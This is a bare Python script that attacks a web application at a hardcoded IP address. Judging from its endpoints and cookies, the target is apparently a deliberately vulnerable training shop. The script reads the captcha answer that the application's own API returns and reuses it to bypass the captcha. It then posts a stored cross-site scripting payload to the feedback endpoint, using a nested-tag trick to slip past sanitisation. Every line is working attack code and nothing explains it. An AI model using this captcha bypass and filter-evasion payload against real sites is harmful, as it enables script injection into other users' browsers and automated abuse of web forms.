from urllib.request import urlopen, Request
from json import dumps, load

response = urlopen(
    Request(
        "http://15.236.144.183:8082/rest/captcha/",
        headers={
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "http://15.236.144.183:8082",
            "Referer": "http://15.236.144.183:8082/",
            "Cookie": (
                "language=en; welcomebanner_status=dismiss;"
                " continueCode=ZaRwEmgxBPbY2oq9vKejJz6AWLU9"
                "TLiKZSrMdpDWVQk837ZrnN1OX5y4lLMD; cookieconsent"
                "_status=dismiss"
            ),
        },
    )
)
data = load(response)
response = urlopen(
    Request(
        "http://15.236.144.183:8082/api/Feedbacks/",
        data=dumps({
            "captchaId": data["captchaId"],
            "captcha": data["answer"],
            "comment": '<<script>Foo</script>iframe src="javascript:alert(`xss`)">',
            "rating": 0,
        }).encode(),
        method="POST",
        headers={
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "http://15.236.144.183:8082",
            "Referer": "http://15.236.144.183:8082/",
            "Cookie": (
                "language=en; welcomebanner_status=dismiss;"
                " continueCode=ZaRwEmgxBPbY2oq9vKejJz6AWLU9"
                "TLiKZSrMdpDWVQk837ZrnN1OX5y4lLMD; cookieconsent"
                "_status=dismiss"
            ),
        },
    )
)